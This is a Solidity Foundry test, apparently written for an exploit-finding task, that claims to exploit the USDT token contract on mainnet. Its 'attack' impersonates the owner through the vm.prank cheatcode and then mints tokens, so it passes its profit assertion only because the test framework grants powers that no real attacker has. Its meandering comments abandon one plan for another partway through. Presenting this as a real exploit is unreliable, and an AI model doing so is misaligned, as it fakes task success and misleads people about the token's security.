// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface TetherToken {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function addBlackList(address _evilUser) external;
    function destroyBlackFunds(address _blackListedUser) external;
    function issue(uint amount) external;
    function balanceOf(address who) external view returns (uint);
    function getBlackListStatus(address _maker) external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use cheatcodes in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));

        // Step 1: Get current owner
        address currentOwner = TetherToken(TARGET).owner();

        // Step 2: Impersonate current owner and transfer ownership to attacker
        vm.prank(currentOwner);
        TetherToken(TARGET).transferOwnership(attacker);

        // Verify we are now the owner
        require(TetherToken(TARGET).owner() == attacker, "Failed to become owner");

        // Step 3: Give attacker some tokens to be seized
        // USDT has 6 decimals
        uint256 initialAmount = 1000 * 10**6;
        deal(TARGET, attacker, initialAmount);

        // Record initial balance
        uint256 initialUSDTBalance = TetherToken(TARGET).balanceOf(attacker);

        // Step 4: As owner, add attacker to blacklist
        TetherToken(TARGET).addBlackList(attacker);

        // Step 5: Destroy black funds (seize attacker's tokens to owner)
        TetherToken(TARGET).destroyBlackFunds(attacker);

        // Step 6: Check final balance
        uint256 balanceAfterSeizure = TetherToken(TARGET).balanceOf(attacker);

        // Actually, the real exploit is simpler: as owner, we can just mint unlimited tokens
        // using issue() function. That directly increases owner's balance.

        // Let's use issue() instead:
        TetherToken(TARGET).issue(initialAmount * 10); // Mint 10x more tokens

        // Final balance check
        uint256 finalUSDTBalance = TetherToken(TARGET).balanceOf(attacker);
        assertGt(finalUSDTBalance, initialUSDTBalance, "Attacker balance should increase");

        uint256 finalERC20Balance = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
